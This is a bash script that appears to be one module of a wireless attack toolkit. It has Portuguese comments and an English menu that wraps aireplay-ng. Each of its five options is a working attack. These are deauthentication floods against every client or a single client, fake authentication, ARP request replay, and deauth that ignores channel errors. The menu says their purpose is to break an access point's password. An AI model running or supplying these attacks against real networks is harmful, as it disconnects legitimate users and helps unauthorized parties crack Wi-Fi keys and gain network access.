#!/bin/bash

clear

logo() {
	clear
	echo -e "=========================================================================="
	echo -e "                               INJECTION                              "
	echo -e "=========================================================================="
	echo -e "\033[01;31m==========================================================================\033[00m"
}



options() {
# Opções:
	clear
	logo
	echo -ne "\n\033[01;32m==========================================================================
	    \n [1] Send packages and deactivate all network clients.\n [2] Send packages and deauthenticate only one client.\n [3] Send a request for false authentication with an associated mac \n to the access point that we want to break the password.\n [4] Accelerate the process by sending ARP REQUEST to the network.\n [5] Send packages and ignore denials of deactivation.\n\n==========================================================================
	    \033[04;01;37m\n\033[01;34m Enter the option:\033[00;37m ";read opcao
	echo
}

options

# Função responsavel por disconectar todos os cliente pendurados na rede.
fun_desconnect_total() {
	clear
	logo
	echo -ne "\n\033[01;33mEnter the BSSID of the network: \033[00;37m";read id_rede
	echo -ne "\033[01;33mInform the network interface in monitor mode: \033[00;37m";read iface
	echo -ne "\033[01;33mEnter the number of packages you want to send: \033[00;37m";read pacotes
	gnome-terminal --geometry=60x25 --hide-menubar --window -x bash -c "aireplay-ng --deauth $pacotes -a $id_rede $iface" &>/dev/null && flag=0 && flag=1
	sleep 2
	clear
	source lib/injection.sh
}

# Função responsável por criar uma falsa conexao para aumentar o fluxo de dados na rede alvo.
fun_fakeauthent(){
	clear
	logo
	echo -ne "\n\033[01;33mEnter the BSSID of the network: \033[00;37m";read id_rede
	echo -ne "\033[01;33mEnter the ESSID of the network, name of the network: \033[00;37m";read essid_rede
	echo -ne "\033[01;33mInform the STATION client on the network: \033[00;37m";read client
	echo -ne "\033[01;33mEnter the time for reassociation, in seconds: \033[00;37m";read time_auth
    echo -ne "\033[01;33mInform the network interface in monitor mode: \033[00;37m";read iface
	echo
	gnome-terminal --geometry=60x25 --hide-menubar --window -x bash -c "aireplay-ng --fakeauth $time_auth -e $essid_rede -a $id_rede -h $client $iface" &>/dev/null && flag=0 && flag=1
	sleep 2
	clear
	source lib/injection.sh
}

# Função responsável por desconectar um cliente em especifico.
fun_disconnect_one_client(){
	clear
	logo
    echo -ne "\n\033[01;33mEnter the BSSID of the network: \033[00;37m";read id_rede
    echo -ne "\033[01;33mInform the network interface in monitor mode: \033[00;37m";read iface
    echo -ne "\033[01;33mEnter the number of packages you want to send: \033[00;37m";read pacotes
	echo -ne "\033[01;33mEnter the STATION of the client connected to the network: \033[00;37m";read id_client
	echo
	gnome-terminal --geometry=60x25 --hide-menubar --window -x bash -c "aireplay-ng --deauth $pacotes -a $id_rede -c $id_client $iface" &>/dev/null && flag=0 && flag=1
	sleep 2
	clear
	source lib/injection.sh

	
}

# Função responsável por acelerar o processo de desautenticação.
fun_proc_arp() {
	clear
	logo
	echo -ne "\n\033[01;33mEnter the BSSID of the network: \033[00;37m";read id_rede	
	echo -ne "\033[01;33mInform the STATION client on the network: \033[00;37m";read client
	echo -ne "\033[01;33mInform the network interface in monitor mode: \033[00;37m";read iface
	echo
	gnome-terminal --geometry=60x25 --hide-menubar --window -x bash -c "aireplay-ng --arpreplay -b $id_rede -h $client $iface" &>/dev/null && flag=0 && flag=1
	sleep 2
	clear
	source lib/injection.sh
}

# Função responsável por injetar pacotes na rede com a opção de negative ignore setada.
fun_ignore_negacao() {
    clear
	logo
	echo -ne "\n\033[01;33mEnter the BSSID of the network: \033[00;37m";read id_rede
	echo -ne "\033[01;33mInform the network interface in monitor mode: \033[00;37m";read iface
	echo -ne "\033[01;33mEnter the number of packages you want to send: \033[00;37m";read pacotes
	gnome-terminal --geometry=60x25 --hide-menubar --window -x bash -c "aireplay-ng --deauth $pacotes -a $id_rede $iface --ignore-negative-one" &>/dev/null && flag=0 && flag=1
	sleep 2
	clear
	source lib/injection.sh
}

case $opcao in
	1) fun_desconnect_total
	;;
	
	2) fun_disconnect_one_client
	;;
	
	3) fun_fakeauthent
	;;

	4) fun_proc_arp
	;;

	5) fun_ignore_negacao
	;;

	*) clear
	source lib/injection.sh
	;;
	
esac
